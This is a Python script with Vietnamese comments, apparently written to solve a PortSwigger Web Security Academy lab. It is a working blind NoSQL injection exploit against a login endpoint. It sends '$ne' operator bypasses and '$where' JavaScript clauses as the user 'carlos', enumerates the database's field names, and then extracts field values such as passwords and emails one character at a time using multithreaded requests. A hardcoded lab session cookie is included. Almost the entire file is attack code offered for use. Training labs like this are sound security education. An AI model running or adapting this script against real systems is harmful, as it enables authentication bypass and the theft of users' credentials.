import requests
import string
import sys
import time
import logging
import concurrent.futures
from requests.adapters import HTTPAdapter

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

# Cấu hình cơ bản
URL = "https://0a3e00fc04761425800b944200fd00a9.web-security-academy.net/login"
SESSION_COOKIE = "x4YK2OvDh4Sx5cf28K8YdoVoDXvg118K"
HEADERS = {
    "Cookie": f"session={SESSION_COOKIE}",
    "Content-Type": "application/json",
    "Origin": "https://0a3e00fc04761425800b944200fd00a9.web-security-academy.net",
    "Referer": "https://0a3e00fc04761425800b944200fd00a9.web-security-academy.net/login",
}

# Charset cho các loại field khác nhau
CHARSET = string.ascii_letters + string.digits + "_"

VALUE_CHARSET = string.ascii_letters + string.digits + "@._-"  # cho email
PASSWORD_CHARSET = string.printable  # cho password

MAX_FIELD_LENGTH = 20
MAX_FIELD_COUNT = 6

# Biến toàn cục lưu trữ các trường đã biết
KNOWN_FIELDS = []

def get_user_field_names():
    """Prompt user to input known field names"""
    if not KNOWN_FIELDS:
        print("\nBạn có muốn nhập các tên trường đã biết không? (y/n)")
        try:
            choice = input().lower()
            if choice != 'y':
                return []
            
            print("Nhập các tên trường đã biết, cách nhau bởi dấu phẩy (ví dụ: username,password,email):")
            field_names = input().encode('utf-8').decode('utf-8').strip().split(',')
            KNOWN_FIELDS.extend([name.strip() for name in field_names if name.strip()])
        except UnicodeDecodeError:
            logging.error("Lỗi mã hóa khi nhập dữ liệu. Vui lòng thử lại với bộ mã UTF-8.")
    return KNOWN_FIELDS

# Tạo một session cho các request
session = requests.Session()

# Tăng kích thước connection pool
adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20)
session.mount("https://", adapter)
session.mount("http://", adapter)

sys.stdout.reconfigure(encoding='utf-8')

def check_field(index, prefix):
    """
    Gửi request với $where sử dụng Object.keys(this)[index].match('^prefix.*$').
    Trả về True nếu khớp, ngược lại trả về False.
    """
    where_clause = f"Object.keys(this)[{index}].match('^{prefix}.*$')"
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": where_clause
    }
    try:
        response = session.post(URL, headers=HEADERS, json=payload, allow_redirects=False, timeout=10)
        if response.status_code == 302:
            return True
        if (response.status_code == 200) and ("Invalid username or password" not in response.text):
            return True
        return False
    except requests.RequestException as e:
        logging.error(f"Request error: {e}")
        return False

def check_known_field(index, known_field):
    """
    Kiểm tra nhanh nếu field tại index khớp chính xác với known_field.
    Nếu đúng, trả về known_field; ngược lại, trả về None.
    """
    # Kiểm tra khớp chính xác toàn bộ tên trường
    where_clause = f"Object.keys(this)[{index}] === '{known_field}'"
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": where_clause
    }
    try:
        response = session.post(URL, headers=HEADERS, json=payload, allow_redirects=False, timeout=10)
        if response.status_code == 302:
            logging.info(f"Field tại chỉ số {index} khớp chính xác với '{known_field}'")
            return known_field
        if (response.status_code == 200) and ("Invalid username or password" not in response.text):
            logging.info(f"Field tại chỉ số {index} khớp chính xác với '{known_field}'")
            return known_field
        return None
    except requests.RequestException as e:
        logging.error(f"Request error: {e}")
        return None

def process_field(index):
    logging.info(f"Quét field thứ {index}")
    # Bước 1: Kiểm tra các field name do người dùng cung cấp
    known_fields = get_user_field_names()
    # Thử khớp chính xác với từng field đã biết
    for field in known_fields:
        result = check_known_field(index, field)
        if result:
            return result
    
    # Bước 2: Build field_name ký tự theo ký tự
    field_name = ""
    while len(field_name) < MAX_FIELD_LENGTH:
        found = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_char = {
                executor.submit(check_field, index, field_name + c): c for c in CHARSET
            }
            for future in concurrent.futures.as_completed(future_to_char):
                try:
                    if future.result():
                        c = future_to_char[future]
                        field_name += c
                        sys.stdout.write(f"\r    -> Đã tìm được prefix: {field_name}")
                        sys.stdout.flush()
                        found = True
                        break  # Dừng vòng lặp for vì đã thêm ký tự
                except Exception as exc:
                    logging.error(f"Error trong quá trình kiểm tra ký tự: {exc}")
        if not found:
            # Nếu không tìm được ký tự mới, thoát vòng lặp
            break

    # Trả về field_name nếu đã có giá trị, dù không mở rộng thêm được nữa
    return field_name if field_name else None

def clean_field_name(field_name):
    """
    Loại bỏ các ký tự đặc biệt không mong muốn trong tên field
    """
    # Chỉ giữ lại các ký tự chữ, số và dấu gạch dưới
    return ''.join(c for c in field_name if c.isalnum() or c == '_')

def enumerate_fields():
    fields_found = []
    consecutive_none = 0  # số index liên tiếp không có field
    for i in range(MAX_FIELD_COUNT):
        result = process_field(i)
        if result:
            logging.info(f"\n    => Field[{i}]: {result}")
            fields_found.append(result)
            consecutive_none = 0  # reset
        else:
            logging.info(f"    -> Không tìm thấy field tại chỉ số {i}.")
            consecutive_none += 1
            if consecutive_none >= 1:  # có thể thay đổi ngưỡng nếu cần
                logging.info("    -> Xác định không còn field nữa. Dừng quét thêm.")
                break
        time.sleep(1)
    return fields_found

def get_charset_for_field(field_name):
    """
    Trả về charset phù hợp cho từng loại field
    """
    if field_name == 'email':
        return VALUE_CHARSET  # Bao gồm @._-
    elif field_name == 'password':
        return PASSWORD_CHARSET  # Bao gồm tất cả printable chars
    else:
        return CHARSET  # Default charset cho các field khác

def dump_field_value(field_name):
    """
    Dump giá trị của field được chỉ định bằng cách brute-force từng ký tự.
    """
    cleaned_field = clean_field_name(field_name)
    logging.info(f"\nĐang dump giá trị của field '{cleaned_field}'...")
    
    # Sử dụng charset phù hợp cho từng loại field
    field_charset = get_charset_for_field(cleaned_field)
    
    value = ""
    while len(value) < MAX_FIELD_LENGTH:
        found = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_char = {
                executor.submit(check_value, cleaned_field, value + c): c 
                for c in field_charset
            }
            for future in concurrent.futures.as_completed(future_to_char):
                try:
                    if future.result():
                        c = future_to_char[future]
                        value += c
                        sys.stdout.write(f"\r    -> Giá trị hiện tại: {value}")
                        sys.stdout.flush()
                        found = True
                        break
                except Exception as exc:
                    logging.error(f"Error trong quá trình dump giá trị: {exc}")
        if not found:
            break
        time.sleep(0.1)  # Thêm delay nhỏ giữa các ký tự
    return value if value else None

def check_value(field_name, prefix):
    """
    Kiểm tra xem field có giá trị bắt đầu bằng prefix hay không.
    """
    # Clean field name trước khi sử dụng trong where clause
    cleaned_field = clean_field_name(field_name)
    where_clause = f"this.{cleaned_field}.match('^{prefix}.*$')"
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": where_clause
    }
    try:
        response = session.post(URL, headers=HEADERS, json=payload, 
                              allow_redirects=False, timeout=10)
        if response.status_code == 302:
            return True
        if (response.status_code == 200 and 
            "Invalid username or password" not in response.text):
            return True
        return False
    except requests.RequestException as e:
        logging.error(f"Request error: {e}")
        return False

if __name__ == "__main__":
    logging.info("Bắt đầu liệt kê các trường trong DB qua injection...\n")
    fields = enumerate_fields()
    
    # In danh sách field tìm được và tạo mapping
    logging.info("\nDanh sách field tìm được:")
    field_mapping = {}  # Lưu trữ mapping giữa index và cleaned field name
    for idx, field in enumerate(fields):
        cleaned_field = clean_field_name(field)
        field_mapping[idx] = cleaned_field
        logging.info(f"    - {idx}: {cleaned_field}")
    
    # Cho phép user chọn field để dump
    while True:
        try:
            choice = input("\nNhập số thứ tự của các field muốn dump (ngăn cách bởi dấu -), ví dụ 1-3-4: ")
            if choice.lower() == 'q':
                break
                
            # Xử lý input của user
            selected_indices = []
            for part in choice.split('-'):
                idx = int(part.strip())
                if idx < 0 or idx >= len(fields):
                    raise ValueError(f"Số thứ tự {idx} không hợp lệ")
                selected_indices.append(idx)
            
            # Dump các field được chọn
            logging.info("\nBắt đầu dump giá trị các field đã chọn...")
            field_values = {}
            
            for idx in selected_indices:
                field = fields[idx]
                cleaned_field = field_mapping[idx]
                value = dump_field_value(field)
                if value:
                    field_values[cleaned_field] = value
                    logging.info(f"\n    => {cleaned_field}: {value}")
                time.sleep(1)
            
            # In kết quả
            logging.info("\nKết quả dump:")
            for idx in selected_indices:
                cleaned_field = field_mapping[idx]
                if cleaned_field in field_values:
                    logging.info(f"    {cleaned_field}: {field_values[cleaned_field]}")
            
            # Hỏi user có muốn tiếp tục dump field khác không
            continue_dump = input("\nBạn có muốn dump thêm field khác không? (y/n): ")
            logging.info("Vui lòng nhập lại hoặc nhấn 'q' để thoát")
        except Exception as e:
            logging.error(f"Có lỗi xảy ra: {str(e)}")
            logging.info("Vui lòng nhập lại hoặc nhấn 'q' để thoát")
    
    logging.info("Kết thúc.")
